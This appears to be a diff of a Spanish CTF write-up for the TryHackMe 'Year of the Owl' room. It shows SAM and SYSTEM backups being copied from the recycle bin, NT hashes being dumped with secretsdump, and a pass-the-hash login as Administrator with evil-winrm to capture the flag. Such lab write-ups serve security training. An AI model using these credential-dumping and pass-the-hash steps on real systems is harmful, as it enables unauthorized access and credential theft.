@@ -271,7 +271,7 @@ Enunciado :
     *Evil-WinRM* PS C:\Users\Jareth\Desktop> type user.txt
     THM{Y2I0N------------I2Y2U4M2IwZTBl}
 
-## Elevamos privilegios NT Authority\SYSTEM
+## Elevamos privilegios
 
  Despues de un buen rato buscando y buscando, pudimos encontrar en la papelera un backup de los ficheros (SAM y SYSTEM)
 
@@ -305,21 +305,67 @@ Enunciado :
         -a----        9/18/2020   7:28 PM          49152 sam.bak
         -a----        9/18/2020   7:28 PM       17457152 system.bak
 
-  3) Nos descargamos los dos ficheros a nuestra maquina.
+3) Nos descargamos los dos ficheros a nuestra maquina.
 
-    *Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> cp sam.bak c:\temp\sam.bak
+        *Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> cp sam.bak c:\temp\sam.bak
      
-    *Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> cp system.bak c:\temp\system.bak
+        *Evil-WinRM* PS C:\$recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001> cp system.bak c:\temp\system.bak
 
-    *Evil-WinRM* PS C:\temp> download sam.bak /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/sam.bak
-                                            
-    Info: Downloading C:\temp\sam.bak to /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/sam.bak                                    
-    Info: Download successful!
-    
-    *Evil-WinRM* PS C:\temp> download system.bak /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/system.bak
-                                            
-    Info: Downloading C:\temp\system.bak to /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/system.bak
-    Info: Download successful!
+        *Evil-WinRM* PS C:\temp> download sam.bak /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/sam.bak                                   
+        Info: Downloading C:\temp\sam.bak to /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/sam.bak                                    
+        Info: Download successful!
+        
+        *Evil-WinRM* PS C:\temp> download system.bak /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/system.bak                                
+        Info: Downloading C:\temp\system.bak to /home/kali/Desktop/ctf/try_ctf/year_ofthe_owl/content/system.bak
+        Info: Download successful!
+
+4) Obtenemos Hash NT de los usuarios.
+
+    Importante para entender la obtencion de los Hash: https://deephacking.tech/passwords-privilege-escalation-en-windows/#sam-system
+
+        ┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]
+        └─# ./secretsdump.py -sam sam.bak -system system.bak LOCAL
+        Impacket v0.11.0 - Copyright 2023 Fortra
+        
+        [*] Target system bootKey: 0xd676472afd9cc13ac271e26890b87a8c
+        [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+        Administrator:500:aad3b435b51404eeaad3b435b51404ee:6bc99ede9ed----------62fb0c0ddcfa7a:::
+        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+        WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
+        Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
+        [*] Cleaning up...
+
+5) Acabamos de obtener el hash NT del usuario Administrator por lo que vamos a obtener una consola como dicho usuario.
+
+       Una característica que tiene Windows, es que sabiendo el hash NT de un usuario, podemos obtener una shell sin necesidad de la contraseña(Info Anterior.)
+
+   Mediante evil-winrm y el hash NT podemos realizar una conexion como Administrator.
+
+       ┌──(root㉿kali)-[/usr/share/doc/python3-impacket/examples]
+       └─# evil-winrm -i 10.10.38.87 -u Administrator -H 6bc99ede9edcfec-------fb0c0ddcfa7a
+                                                
+       Evil-WinRM shell v3.5
+                                                
+       Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                                
+       Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                                
+       Info: Establishing connection to remote endpoint
+       *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+       year-of-the-owl\administrator
+
+   obtenemos flag admin
+
+       *Evil-WinRM* PS C:\Users\Administrator\desktop> type admin.txt
+        THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}
+
+
+     
+        
+
+
+     
 
 
 
